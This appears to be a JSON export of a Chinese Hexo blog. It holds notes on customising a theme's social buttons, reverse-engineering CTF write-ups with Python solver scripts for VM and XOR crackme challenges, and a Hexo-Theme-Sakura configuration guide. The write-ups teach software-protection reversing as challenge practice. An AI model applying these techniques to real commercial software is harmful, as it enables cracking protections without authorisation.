/categories/随想/, fa: fa-commenting-o }, # 转载: {path: /categories/转载/, fa: fa-book } 一些代码更新中用到的代码 更新hexo到github并发布 hexo -g &amp;&amp; -d 更新cdn git add . git commit -m &quot;update&quot; git push 建立新的md文件 hexo new xx.md 期间遇到的坑当时有一个social图标，wechat会有相应二维码展示，我qq用的比较多，想在qq上也用上二维码，但发现仅仅改变_config.yml的代码让其和wechat一样，发现不行,没有效果，然后就是个人的操作了。 首先去网页源码去观察到了wechat的不同之处 li class=&quot;wechat&quot; a href=&quot;/#&quot; img src=&quot;https://cdn.jsdelivr.net/gh/shijingtian/cdn@master/img/social/wechat.png&quot; /a div class=&quot;wechatInner&quot; img src=&quot;https://cdn.jsdelivr.net/gh/shijingtian/cdn@master/img/custom/wechat_q.png&quot; /div /li 有一个wechatInner，大概是一个已经标定好的类，于是在headertop.ejs里面找到了他，看了看语法，根据模样我在里面加了一个筛选条件 % if (i == &#39;wechat&#39; || i == &#39;tencent&#39;) {% % if(i == 'wechat') {% li class=\"wechat\" a href=\"%= theme.social[i].url%\" img src=\"%- (theme.cdn || '') + theme.social[i].img%\" /a div class=\"wechatInner\" img src=\"%- (theme.cdn || '') + theme.social[i].qrcode%\" /div /li %} else {% li class=&quot;tencent&quot; a href=&quot;%= theme.social[i].url%&quot; img src=&quot;%- (theme.cdn || &#39;&#39;) + theme.social[i].img%&quot; /a div class=&quot;tencentInner&quot; img src=&quot;%- (theme.cdn || &#39;&#39;) + theme.social[i].qrcode%&quot; /div /li % } % % } else { % li a href=&quot;%= theme.social[i].url%&quot; target=&quot;_blank&quot; class=&quot;social-github&quot; title=&quot;%- i %&quot; img src=&quot;%- (theme.cdn || &#39;&#39;) + theme.social[i].img%&quot; /a /li % } % 运行发现还是不行，请教大神之后，明白还要在style.css文件里面添加相应的类别才行，添加如下（和wechat一致就可以） .tencent { width:35px; height:35px; position:relative } .tencentInner img { border-radius:0; width:121px; height:auto; padding:0; background:none } .tencentInner { width:121px; height:121px; padding:10px; background:rgba(0,0,0,.4); top:40px; left:-40px; -webkit-transform:translate3d(0,50px,0); transform:translate3d(0,50px,0); opacity:0 } .tencentInner:before { content:&quot;&quot;; position:absolute; top:-30px; left:50%; margin-left:-15px; border-width:15px; border-style:solid; border-color:transparent transparent rgba(0,0,0,.4) transparent } .tencentInner { position:absolute; border-radius:8px; transition:.7s all ease; -webkit-transition:.7s all ease; -moz-transition:.7s all linear; -o-transition:.7s all ease; -ms-transition:.7s all ease } .tencent:hover .tencentInner { -webkit-transform:translate3d(0,16px,0); transform:translate3d(0,16px,0); opacity:1; visibility:visible } 最后实现效果第一次完整搭建了自己的博客，学到了许多，后面就赶紧把最近学的PE文件格式的学习笔记搭上来。还是需要不断努力，翻滚吧，阿天~~~","categories":[{"name":"基础技术","slug":"基础技术","permalink":"/categories/基础技术/"}],"tags":[],"keywords":[{"name":"基础技术","slug":"基础技术","permalink":"/categories/基础技术/"}]},{"title":"逆向ctf练习","slug":"ctf/日常逆向ctf练习","date":"2019-12-16T01:07:01.000Z","updated":"2020-03-03T07:35:20.172Z","comments":true,"path":"2019/12/16/ctf/日常逆向ctf练习/","link":"","permalink":"/2019/12/16/ctf/日常逆向ctf练习/","excerpt":"","text":"nctf——HomuraVM虚拟机的题目，只要把每个字符代表的意思读懂就行 MCh: r2=(r1+flag[xxx])-2(r1 &amp; flag[xxx]);(flag+1){mG}: flag[xxx]=r2;r2=0Hv: (flag+1);r2=r1{aG}: r1=0;r2=0[ur]: r1=flag[xxx];flag=0Ov: (flag-1);(r2=r1)[无用]a: r1–;r: r1++;h: (flag+1) 下面是wp def fuc(r1,flag): return (r1 + flag) - 2 * (r1 &amp; flag) order_list1=[&quot;1&quot;,&quot;aaa&quot;,&quot;rr&quot;,&quot;rarara&quot;,&quot;rararrr&quot;,&quot;araraa&quot;,&quot;rararrara&quot;,&quot;rrrarrr&quot;,&quot;aarrarr&quot;,&quot;aaarrar&quot;,&quot;rrrarr&quot;,&quot;aarrraa&quot;,&quot;arraar&quot;,&quot;rrraaarr&quot;,&quot;aaarrrrarr&quot;,&quot;rrrraarrarr&quot;,&quot;rrarra&quot;,&quot;aaraar&quot;,&quot;ovrrarra&quot;,&quot;aarrrar&quot;,&quot;rraarra&quot;,&quot;rrar&quot;,&quot;aarrar&quot;,&quot;rrraar&quot;,&quot;rrrraa&quot;,&quot;rrarra&quot;,&quot;rrrrrr&quot;,&quot;aaaar&quot;,&quot;rraaa&quot;,&quot;aarra&quot;,&quot;rrar&quot;,&quot;aarraa&quot;,&quot;aarrara&quot;,&quot;aarrarar&quot;] end=[27,114,17,118,8,74,126,5,55,124,31,88,104,7,112,7,49,108,4,47,4,105,54,77,127,8,80,12,109,28,127,80,29,96] count=1 flag=[125];tem=[] r1=0;r2=0 out=&quot;&quot; while(count&lt;=34): for i in range(25,126): if(count==1): if (fuc(flag[count-1],i) == end[count - 1]): flag.append(i) out += chr(flag[count]) break else: r_c=order_list1[count-1].count(&#39;r&#39;) a_c=order_list1[count-1].count(&#39;a&#39;) i1=i+r_c-a_c #print(count,flag,end,i1) if(fuc(end[count-2],i1)==end[count-1]): flag.append(i) out+=chr(flag[count]) break count+=1 print(out) easyRE——(忘了那个比赛出的了)很简单的逻辑，判断长度然后judge一下就出来了然后打开judge，有一个sp手段，修复之后，发现什么都不是但观察到，代码下方有许多的数据看到开始发现有一个judge的异或操作，所以理解题目意思，将judge的数据与0xc异或然后得到正常代码，正常运行一下就行（这里注意运行之前先把judge全部变成data，不然会出现代码混乱类似于以下情况） 未转换成data图转换成data图然后就是一个究极简单的异或，做一个简单的题放松一下 a=[102,109,99,100,127,107,55,100,59,86,96,59,110,112] flag=&quot;&quot; for i in range (len(a)): flag+=chr(a[i]^i) print flag blackcase又是一个小小的虚拟机问题，给的txt文件就是一个测试通过后显示里面的文本，没别的大用，主要是第二次输入的password，然后找到相关的op码代表的含义就可以了。 这里是通过我们输入的值，call相关的sub这里就是我们的一些操作根据动调找到八个相关的操作码在这里有一些位置要标记a1 + 665 #类似一个暂时寄存器（设为eax）a1 + 664 #得到下一位输入的值a1 + 8 #得到我们输入的字符串stra1 + 288 #index（下标） 分析函数fuc1: eax=str[index]fuc2: str[index[=eaxfuc3: eax=eax+next_input-33fuc4: eax=eax-next_input+33fuc5: index++fuc6: checkfuc7: index–fuc8: str[index] = input[index+next_input-48]-49fuc9: index=next_input; str[index] = input[index+next_input-48]-49 然后构造opcode序列就好$t/80表示：var = str[0] var = 80var = var - input[2] + 33 = 66str[0] = varindex++ 类似，可构建产生Binggo的opcode序列为 $t/80$C)80$CI80$CX80$Cg80$Cj8处理多余位数 0#J1index– uuuuuuu调用func6 Es $t/80$C)80$CI80$CX80$Cg80$Cj80#J1uuuuuuuEs（因为好长时间了，自己的操作码都忘了，所以这里直接放进大佬的操作） 这里可以多解的，我们不让check做最后一次，我们让check中的else实现，然后打印某一位置的字符，再通过相关操作把该位置的字符改成Binggo也是可以的 网安运维塞——re3（0x27BC86A9）这道题是一个类矩阵乘法，2x2的矩阵进行相乘，首先要求我们输入三个数，然后一个一个检测，每个数进行右移，每进行一次就做一次运算，最后得到一个0x27BC86A9即可这里有两个矩阵，我们称其为q_list1和q_list2,这里我卡了很长时间，本来是想爆破的，但后来发现一直都不行，无奈只好仔细看算法。 我们输入的数转成二进制，每一位都会进行判断，如果是1，那便q_list2=q_list1q_list2，不管是不是1都要进行q_list1=q_list1。 而且再仔细看，q_list2的初值比较特殊，既q_list2[0]*q_list1=q_list1,乘任何数都等于任何数它本身，相当于乘法里的1，而且那么我们可以把最后结果变成这样q_list2=q_list1[0] x q_list[1] x……x q_list[n] q_list[1] = q_list[0]^2(这里指2次方)q_list[2] = q_list[0]^4…q_list[2] = q_list[0]^( 2^(n-1) )最后我们我们就让q_list[0]自乘，一直得到我们想要的值就行，他的自乘次数就是我们想要的值，爆破就完事了 def fff(v27): return (v27 - 666666666 * ((((0x67144772A3C047E5 * v27) &gt;&gt; 64) &gt;&gt; 28) - (v27 &gt;&gt; 63))) def fuc(q_list1, q_list2): #为了加快爆破速度，这里我们把它简化 q_list3 = [[0, 0], [0, 0]] q_list3[0][0] = fff(fff(fff(q_list1[0][0] * q_list2[0][0])) + fff(q_list1[0][1] * q_list2[1][0])) q_list3[0][1] = fff(fff(fff(q_list1[0][0] * q_list2[0][1])) + fff(q_list1[0][1] * q_list2[1][1])) q_list3[1][0] = fff(fff(fff(q_list1[1][0] * q_list2[0][0])) + fff(q_list1[1][1] * q_list2[1][0])) q_list3[1][1] = fff(fff(fff(q_list1[1][0] * q_list2[1][0])) + fff(q_list1[1][1] * q_list2[1][1])) return q_list3 for i in range(pow(2,32)): #这里让他跑就行了，大概20分钟所有数据就都出来了 q_list1=fuc(q_list1,q) #print(i) if(q_list1[0][1]==0x220951BB): print (q_list1) print(i) #print(q_list1) #print (i) 最后得到三批数据，带进去就好了，这里提醒一下，我们出来的次数要加1才是最后的值 blackcase题目大佬地址 https://blog.csdn.net/q1uTruth/article/details/99943837","categories":[{"name":"逆向","slug":"逆向","permalink":"/categories/逆向/"}],"tags":[],"keywords":[{"name":"逆向","slug":"逆向","permalink":"/categories/逆向/"}]},{"title":"Hexo-Theme-Sakura","slug":"基础/Hexo-Theme-Sakura","date":"2018-12-12T14:16:01.000Z","updated":"2020-04-01T03:46:02.003Z","comments":true,"path":"2018/12/12/基础/Hexo-Theme-Sakura/","link":"","permalink":"/2018/12/12/基础/Hexo-Theme-Sakura/","excerpt":"","text":"hexo-theme-sakura主题 English document 基于WordPress主题Sakura修改成Hexo的主题。 demo预览 正在开发中…… 交流群若你是使用者，加群QQ: 801511924 若你是创作者，加群QQ: 194472590 主题特性 首页大屏视频 首页随机封面 图片懒加载 valine评论 fancy-box相册 pjax支持，音乐不间断 aplayer音乐播放器 多级导航菜单（按现在大部分hexo主题来说，这也算是个特性了） 赞赏作者如果喜欢hexo-theme-sakura主题，可以考虑资助一下哦~非常感激！ paypal | Alipay 支付宝 | WeChat Pay 微信支付 未完善的使用教程那啥？老实说我目前也不是很有条理233333333~ 1、主题下载安装hexo-theme-sakura建议下载压缩包格式，因为除了主题内容还有些source的配置对新手来说比较太麻烦，直接下载解压就省去这些麻烦咯。 下载好后解压到博客根目录（不是主题目录哦，重复的选择替换）。接着在命令行（cmd、bash）运行npm i安装依赖。 2、主题配置博客根目录下的_config配置站点 # Site title: 你的站点名 subtitle: description: 站点简介 keywords: author: 作者名 language: zh-cn timezone: 部署 deploy: type: git repo: github: 你的github仓库地址 # coding: 你的coding仓库地址 branch: master 备份 （使用hexo b发布备份到远程仓库） backup: type: git message: backup my blog of https://honjun.github.io/ repository: # 你的github仓库地址,备份分支名 （建议新建backup分支） github: https://github.com/honjun/honjun.github.io.git,backup # coding: https://git.coding.net/hojun/hojun.git,backup 主题目录下的_config配置其中标明【改】的是需要修改部门，标明【选】是可改可不改，标明【非】是不用改的部分 # site name # 站点名 【改】 prefixName: さくら荘その siteName: hojun # favicon and site master avatar # 站点的favicon和头像 输入图片路径（下面的配置是都是cdn的相对路径，没有cdn请填写完整路径，建议使用jsdeliver搭建一个cdn啦，先去下载我的cdn替换下图片就行了，简单方便~）【改】 favicon: /images/favicon.ico avatar: /img/custom/avatar.jpg # 站点url 【改】 url: https://sakura.hojun.cn # 站点介绍（或者说是个人签名）【改】 description: Live your life with passion! With some drive! # 站点cdn，没有就为空 【改】 若是cdn为空，一些图片地址就要填完整地址了，比如之前avatar就要填https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/custom/avatar.jpg cdn: https://cdn.jsdelivr.net/gh/honjun/cdn@1.6 # 开启pjax 【选】 pjax: 1 # 站点首页的公告信息 【改】 notice: hexo-Sakura主题已经开源，目前正在开发中... # 懒加载的加载中图片 【选】 lazyloadImg: https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg # 站点菜单配置 【选】 menus: 首页: { path: /, fa: fa-fort-awesome faa-shake } 归档: { path: /archives, fa: fa-archive faa-shake, submenus: { 技术: {path: /categories/技术/, fa: fa-code }, 生活: {path: /categories/生活/, fa: fa-file-text-o }, 资源: {path: /categories/资源/, fa: fa-cloud-download }, 随想: {path: /categories/随想/, fa: fa-commenting-o }, 转载: {path: /categories/转载/, fa: fa-book } } } 清单: { path: javascript:;, fa: fa-list-ul faa-vertical, submenus: { 书单: {path: /tags/悦读/, fa: fa-th-list faa-bounce }, 番组: {path: /bangumi/, fa: fa-film faa-vertical }, 歌单: {path: /music/, fa: fa-headphones }, 图集: {path: /tags/图集/, fa: fa-photo } } } 留言板: { path: /comment/, fa: fa-pencil-square-o faa-tada } 友人帐: { path: /links/, fa: fa-link faa-shake } 赞赏: { path: /donate/, fa: fa-heart faa-pulse } 关于: { path: /, fa: fa-leaf faa-wrench , submenus: { 我？: {path: /about/, fa: fa-meetup}, 主题: {path: /theme-sakura/, fa: iconfont icon-sakura }, Lab: {path: /lab/, fa: fa-cogs }, } } 客户端: { path: /client/, fa: fa-android faa-vertical } RSS: { path: /atom.xml, fa: fa-rss faa-pulse } # Home page sort type: -1: newer first，1: older first. 【非】 homePageSortType: -1 # Home page article shown number) 【非】 homeArticleShown: 10 # 背景图片 【选】 bgn: 8 # startdash面板 url, title, desc img 【改】 startdash: - {url: /theme-sakura/, title: Sakura, desc: 本站 hexo 主题, img: /img/startdash/sakura.md.png} - {url: http://space.bilibili.com/271849279, title: Bilibili, desc: 博主的b站视频, img: /img/startdash/bilibili.jpg} - {url: /, title: hojun的万事屋, desc: 技术服务, img: /img/startdash/wangshiwu.jpg} # your site build time or founded date # 你的站点建立日期 【改】 siteBuildingTime: 07/17/2018 # 社交按钮(social) url, img PC端配置 【改】 social: github: {url: http://github.com/honjun, img: /img/social/github.png} sina: {url: http://weibo.com/mashirozx?is_all=1, img: /img/social/sina.png} wangyiyun: {url: http://weibo.com/mashirozx?is_all=1, img: /img/social/wangyiyun.png} zhihu: {url: http://weibo.com/mashirozx?is_all=1, img: /img/social/zhihu.png} email: {url: http://weibo.com/mashirozx?is_all=1, img: /img/social/email.svg} wechat: {url: /#, qrcode: /img/custom/wechat.jpg, img: /img/social/wechat.png} # 社交按钮(msocial) url, img 移动端配置 【改】 msocial: github: {url: http://github.com/honjun, fa: fa-github, color: 333} weibo: {url: http://weibo.com/mashirozx?is_all=1, fa: fa-weibo, color: dd4b39} qq: {url: https://wpa.qq.com/msgrd?v=3&amp;uin=954655431&amp;site=qq&amp;menu=yes, fa: fa-qq, color: 25c6fe} # 赞赏二维码（其中wechatSQ是赞赏单页面的赞赏码图片）【改】 donate: alipay: /img/custom/donate/AliPayQR.jpg wechat: /img/custom/donate/WeChanQR.jpg wechatSQ: /img/custom/donate/WeChanSQ.jpg # 首页视频地址为https://cdn.jsdelivr.net/gh/honjun/hojun@1.2/Unbroken.mp4，配置如下 【改】 movies: url: https://cdn.jsdelivr.net/gh/honjun/hojun@1.2 # 多个视频用逗号隔开，随机获取。支持的格式目前已知MP4,Flv。其他的可以试下，不保证有用 name: Unbroken.mp4 # 左下角aplayer播放器配置 主要改id和server这两项，修改详见[aplayer文档] 【改】 aplayer: id: 2660651585 server: netease type: playlist fixed: true mini: false autoplay: false loop: all order: random preload: auto volume: 0.7 mutex: true # Valine评论配置【改】 valine: true v_appId: GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz v_appKey: mgOpfzbkHYqU92CV4IDlAUHQ 分类页和标签页配置分类页 标签页 配置项在\\themes\\Sakura\\languages\\zh-cn.yml里。新增一个分类或标签最好加下哦，当然嫌麻烦可以直接使用一张默认图片（可以改主题或者直接把404图片替换下，征求下意见要不要给这个在配置文件中加个开关，可以issue或群里提出来），现在是没设置的话会使用那种倒立小狗404哦。 #category # 按分类名创建 技术: #中文标题 zh: 野生技术协会 # 英文标题 en: Geek – Only for Love # 封面图片 img: https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/banner/coding.jpg 生活: zh: 生活 en: live img: https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/banner/writing.jpg #tag # 标签名即是标题 悦读: # 封面图片 img: https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/banner/reading.jpg 单页面封面配置如留言板页面页面，位于source下的comment下，打开index.md如下： --- title: comment date: 2018-12-20 23:13:48 keywords: 留言板 description: comments: true # 在这里配置单页面头部图片，自定义替换哦~ photos: https://cdn.jsdelivr.net/gh/honjun/cdn@1.4/img/banner/comment.jpg --- 单页面配置番组计划页 （请直接在下载后的文件中改，下面的添加了注释可能会有些影响） --- layout: bangumi title: bangumi comments: false date: 2019-02-10 21:32:48 keywords: description: bangumis: # 番组图片 - img: https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg # 番组名 title: 朝花夕誓——于离别之朝束起约定之花 # 追番状态 （追番ing/已追完） status: 已追完 # 追番进度 progress: 100 # 番剧日文名称 jp: さよならの朝に約束の花をかざろう # 放送时间 time: 放送时间: 2018-02-24 SUN. # 番剧介绍 desc: 住在远离尘嚣的土地，一边将每天的事情编织成名为希比欧的布，一边静静生活的伊欧夫人民。在15岁左右外表就停止成长，拥有数百年寿命的他们，被称为“离别的一族”，并被视为活着的传说。没有双亲的伊欧夫少女玛奇亚，过着被伙伴包围的平稳日子，却总感觉“孤身一人”。他们的这种日常，一瞬间就崩溃消失。追求伊欧夫的长寿之血，梅萨蒂军乘坐着名为雷纳特的古代兽发动了进攻。在绝望与混乱之中，伊欧夫的第一美女蕾莉亚被梅萨蒂带走，而玛奇亚暗恋的少年克里姆也失踪了。玛奇亚虽然总算逃脱了，却失去了伙伴和归去之地……。 - img: https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg title: 朝花夕誓——于离别之朝束起约定之花 status: 已追完 progress: 50 jp: さよならの朝に約束の花をかざろう time: 放送时间: 2018-02-24 SUN. desc: 住在远离尘嚣的土地，一边将每天的事情编织成名为希比欧的布，一边静静生活的伊欧夫人民。在15岁左右外表就停止成长，拥有数百年寿命的他们，被称为“离别的一族”，并被视为活着的传说。没有双亲的伊欧夫少女玛奇亚，过着被伙伴包围的平稳日子，却总感觉“孤身一人”。他们的这种日常，一瞬间就崩溃消失。追求伊欧夫的长寿之血，梅萨蒂军乘坐着名为雷纳特的古代兽发动了进攻。在绝望与混乱之中，伊欧夫的第一美女蕾莉亚被梅萨蒂带走，而玛奇亚暗恋的少年克里姆也失踪了。玛奇亚虽然总算逃脱了，却失去了伙伴和归去之地……。 --- 友链页 （请直接在下载后的文件中改，下面的添加了注释可能会有些影响） --- layout: links title: links # 创建日期，可以改下 date: 2018-12-19 23:11:06 # 图片上的标题，自定义修改 keywords: 友人帐 description: # true/false 开启/关闭评论 comments: true # 页面头部图片，自定义修改 photos: https://cdn.jsdelivr.net/gh/honjun/cdn@1.4/img/banner/links.jpg # 友链配置 links: # 类型分组 - group: 个人项目 # 类型简介 desc: 充分说明这家伙是条咸鱼 &lt; (￣︶￣)&gt; items: # 友链链接 - url: https://shino.cc/fgvf # 友链头像 img: https://cloud.moezx.cc/Picture/svg/landscape/fields.svg # 友链站点名 name: Google # 友链介绍 下面雷同 desc: Google 镜像 - url: https://shino.cc/fgvf img: https://cloud.moezx.cc/Picture/svg/landscape/fields.svg name: Google desc: Google 镜像 # 类型分组... - group: 小伙伴们 desc: 欢迎交换友链 ꉂ(ˊᗜˋ) items: - url: https://shino.cc/fgvf img: https://cloud.moezx.cc/Picture/svg/landscape/fields.svg name: Google desc: Google 镜像 - url: https://shino.cc/fgvf img: https://cloud.moezx.cc/Picture/svg/landscape/fields.svg name: Google desc: Google 镜像 --- 写文章配置主题集成了个人插件hexo-tag-bili和hexo-tag-fancybox_img。其中hexo-tag-bili用来在文章或单页面中插入B站外链视频，使用语法如下： {% bili video_id [page] %} 详细使用教程详见hexo-tag-bili。 hexo-tag-fancybox_img用来在文章或单页面中图片，使用语法如下： {% fb_img src [caption] %} 详细使用教程详见hexo-tag-fancybox_img 还有啥，一时想不起来……To be continued…","categories":[{"name":"基础技术","slug":"基础技术","permalink":"/categories/基础技术/"}],"tags":[],"keywords":[{"name":"基础技术","slug":"基础技术","permalink":"/categories/基础技术/"}]}]}